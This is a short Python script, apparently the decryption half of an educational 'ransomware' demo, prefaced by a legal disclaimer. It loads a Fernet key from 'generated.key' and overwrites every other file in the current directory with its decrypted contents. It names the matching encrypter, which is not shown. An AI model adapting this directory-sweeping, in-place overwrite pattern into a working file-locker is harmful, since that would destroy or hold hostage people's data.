## Legal Disclaimer
"""
This project is intended for educational purposes only.

The encryption and decryption scripts included in this repository are provided to demonstrate how symmetric key cryptography (Fernet) works using Python's `cryptography` library.

Under no circumstances should this code be used to encrypt, lock, or modify data on systems or devices that you do not own or do not have explicit permission to access.

The developer is not responsible for any misuse, damage, or legal consequences resulting from the use of this code. By using or sharing this project, you agree to use it ethically and legally.

Use at your own risk.
"""
import os
from cryptography.fernet import Fernet

# List to store the names of files to be decrypted
file_list = []

# Loop through all files in the current directory
for file in os.listdir():
    # Skip these specific files
    if file == "ransom_encrypter.py" or file == "generated.key" or file == "ransom_decrypter.py":
        continue
    # Only add regular files (not directories)
    if os.path.isfile(file):
        file_list.append(file)

# Read the encryption key from the file
with open("generated.key", "rb") as generatedKey:
    secret_key = generatedKey.read()

# Loop through each file and attempt to decrypt it
for file in file_list:
    # Open the file in binary read mode and read its contents
    with open(file, "rb") as the_file:
        contents = the_file.read()

    # Decrypt the contents using the secret key
    contents_decrypted = Fernet(secret_key).decrypt(contents)

    # Write the decrypted contents back to the file (overwrite)
    with open(file, "wb") as the_file:
        the_file.write(contents_decrypted)
